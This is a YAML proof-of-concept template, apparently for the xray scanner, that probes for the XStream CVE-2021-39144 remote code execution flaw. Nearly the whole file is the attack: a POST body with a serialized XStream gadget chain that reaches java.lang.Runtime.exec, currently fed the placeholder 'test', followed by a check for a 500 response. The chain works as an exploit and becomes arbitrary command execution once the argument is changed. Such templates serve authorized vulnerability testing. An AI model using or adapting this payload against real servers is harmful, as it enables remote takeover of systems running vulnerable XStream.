name: poc-yaml-xstream-cve-2021-39144-rce
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /
            body: <java.util.PriorityQueue serialization='custom'><unserializable-parents/><java.util.PriorityQueue><default><size>2</size></default><int>3</int><dynamic-proxy><interface>java.lang.Comparable</interface><handler class='sun.tracing.NullProvider'><active>true</active><providerType>java.lang.Comparable</providerType><probes><entry><method><class>java.lang.Comparable</class><name>compareTo</name><parameter-types><class>java.lang.Object</class></parameter-types></method><sun.tracing.dtrace.DTraceProbe><proxy class='java.lang.Runtime'/><implementing__method><class>java.lang.Runtime</class><name>exec</name><parameter-types><class>java.lang.String</class></parameter-types></implementing__method></sun.tracing.dtrace.DTraceProbe></entry></probes></handler></dynamic-proxy><string>test</string></java.util.PriorityQueue></java.util.PriorityQueue>
            follow_redirects: false
        expression: response.status == 500 && response.body.bcontains(b"Internal Server Error")
expression: r0()
detail:
    author: For3stCo1d (https://github.com/For3stCo1d)
    links:
        - https://x-stream.github.io/CVE-2021-39144.html
